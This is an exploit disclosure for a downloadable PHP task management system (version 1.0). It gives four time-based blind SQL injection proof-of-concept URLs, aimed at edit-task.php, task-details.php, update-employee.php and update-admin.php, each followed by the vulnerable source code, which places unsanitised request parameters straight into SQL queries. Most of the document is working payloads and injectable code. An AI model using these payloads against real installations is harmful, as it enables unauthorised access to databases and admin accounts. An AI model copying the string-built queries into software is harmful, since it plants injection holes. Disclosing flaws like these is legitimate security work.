### Exploit Title: Task Management System - multiple vulnerabilities

### Date: 2024-03/15

### Exploit Author: Peanut886

### Vendor Homepage: https://www.sourcecodester.com

### Software Link: https://www.sourcecodester.com/download-code?nid=17217&title=php+task+management+system+free+download

### Version: 1.0

### Tested on: windows11 + phpstudy

# **1.SQL injection vulnerability in edit-task.php**
---
## Sample request POC #1

```
http://127.0.0.1:8002/edit-task.php?task_id=42%27%20AND%20(SELECT%209756%20FROM%20(SELECT(SLEEP(5)))hpat)%20AND%20%27RgbJ%27=%27RgbJ
```
## Sqlmap running results #1

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Task%20Management%20System%20-%20multiple%20vulnerabilities/1.edit-task.php.jpg "Task Management System")

## Related Codes edit-task.php

```
<?php

require 'authentication.php'; // admin authentication check 

// auth check
$user_id = $_SESSION['admin_id'];
$user_name = $_SESSION['name'];
$security_key = $_SESSION['security_key'];
if ($user_id == NULL || $security_key == NULL) {
    header('Location: index.php');
}
//  Author Name: Mayuri K. 
 // for any PHP, Codeignitor, Laravel OR Python work contact me at mayuri.infospace@gmail.com  
 //Visit website : www.mayurik.com
// check admin
$user_role = $_SESSION['user_role'];

$task_id = $_GET['task_id'];



if(isset($_POST['update_task_info'])){
    $obj_admin->update_task_info($_POST,$task_id, $user_role);
}

$page_name="Edit Task";
include("include/sidebar.php");

$sql = "SELECT * FROM task_info WHERE task_id='$task_id' ";
$info = $obj_admin->manage_all_info($sql);
$row = $info->fetch(PDO::FETCH_ASSOC);

?>
```

# **2.SQL injection vulnerability in task-details.php**
---
## Sample request POC #2

```
http://127.0.0.1:8002/task-details.php?task_id=42%27%20AND%20(SELECT%204726%20FROM%20(SELECT(SLEEP(5)))YiQe)%20AND%20%27eEyy%27=%27eEyy
```
## Sqlmap running results #2

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Task%20Management%20System%20-%20multiple%20vulnerabilities/2.task-details.php.jpg "Task Management System")

## Related Codes task-details.php

```
<?php

require 'authentication.php'; // admin authentication check 

// auth check
$user_id = $_SESSION['admin_id'];
$user_name = $_SESSION['name'];
$security_key = $_SESSION['security_key'];
if ($user_id == NULL || $security_key == NULL) {
    header('Location: index.php');
}
//  Author Name: Mayuri K. 
 // for any PHP, Codeignitor, Laravel OR Python work contact me at mayuri.infospace@gmail.com  
 //Visit website : www.mayurik.com
// check admin
$user_role = $_SESSION['user_role'];

$task_id = $_GET['task_id'];



if(isset($_POST['update_task_info'])){
    $obj_admin->update_task_info($_POST,$task_id, $user_role);
}

$page_name="Edit Task";
include("include/sidebar.php");

$sql = "SELECT a.*, b.fullname 
FROM task_info a
LEFT JOIN tbl_admin b ON(a.t_user_id = b.user_id)
WHERE task_id='$task_id'";
$info = $obj_admin->manage_all_info($sql);
$row = $info->fetch(PDO::FETCH_ASSOC);

?>
```

# **3.SQL injection vulnerability in update-employee.php**
---
## Sample request POC #3

```
http://127.0.0.1:8002/update-employee.php?admin_id=28%27%20AND%20(SELECT%204097%20FROM%20(SELECT(SLEEP(5)))eBCs)%20AND%20%27sDCt%27=%27sDCt
```
## Sqlmap running results #3

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Task%20Management%20System%20-%20multiple%20vulnerabilities/3.update-employee.php.jpg "Task Management System")

## Related Codes update-employee.php

```
<?php

require 'authentication.php'; // admin authentication check 

// auth check
$user_id = $_SESSION['admin_id'];
$user_name = $_SESSION['name'];
$security_key = $_SESSION['security_key'];
if ($user_id == NULL || $security_key == NULL) {
    header('Location: index.php');
}

// check admin
$user_role = $_SESSION['user_role'];
if ($user_role != 1) {
  header('Location: task-info.php');
}

$admin_id = $_GET['admin_id'];

if(isset($_POST['update_current_employee'])){

    $obj_admin->update_user_data($_POST,$admin_id);
}

if(isset($_POST['btn_user_password'])){

    $obj_admin->update_user_password($_POST,$admin_id);
}



$sql = "SELECT * FROM tbl_admin WHERE user_id='$admin_id' ";
$info = $obj_admin->manage_all_info($sql);
$row = $info->fetch(PDO::FETCH_ASSOC);
        
$page_name="Admin";
include("include/sidebar.php");
?>
```

# **4.SQL injection vulnerability in update-admin.php**
---
## Sample request POC #4

```
http://127.0.0.1:8002/update-admin.php?admin_id=1%27%20AND%20(SELECT%202261%20FROM%20(SELECT(SLEEP(5)))NwTQ)%20AND%20%27ZBIP%27=%27ZBIP
```
## Sqlmap running results #4

![blockchain](https://github.com/Peanut886/Vulnerability/raw/main/imgs/20240315-Task%20Management%20System%20-%20multiple%20vulnerabilities/4.update-admin.php.jpg "Task Management System")

## Related Codes update-admin.php

```
<?php

require 'authentication.php'; // admin authentication check 

// auth check
$user_id = $_SESSION['admin_id'];
$user_name = $_SESSION['name'];
$security_key = $_SESSION['security_key'];
if ($user_id == NULL || $security_key == NULL) {
    header('Location: index.php');
}


$admin_id = $_GET['admin_id'];

if(isset($_POST['update_current_employee'])){
    $obj_admin->update_admin_data($_POST,$admin_id);
}

if(isset($_POST['btn_user_password'])){
    $obj_admin->update_user_password($_POST,$admin_id);
}

$sql = "SELECT * FROM tbl_admin WHERE user_id='$admin_id' ";
$info = $obj_admin->manage_all_info($sql);
$row = $info->fetch(PDO::FETCH_ASSOC);
             
$page_name="Admin";
include("include/sidebar.php");

?>
```
